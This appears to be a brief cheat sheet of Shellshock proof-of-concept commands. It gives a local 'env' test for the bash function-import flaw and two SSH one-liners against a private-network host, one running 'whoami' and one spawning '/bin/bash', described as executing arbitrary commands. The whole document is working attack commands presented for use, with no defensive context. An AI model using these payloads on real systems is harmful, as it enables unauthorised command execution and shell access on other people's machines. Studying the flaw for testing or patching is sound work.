# Shellshock PoC
env x='() { :;}; echo vulnerable' bash -c "echo this is a test"

# executing arbitrary commands by exploiting SSH via shellshock
ssh user@192.168.0.1 -t '() { :;}; whoami'

# spwan bash shell by exploiting SSH via shellshock
ssh user@192.168.0.1 -t '() { :;}; /bin/bash'
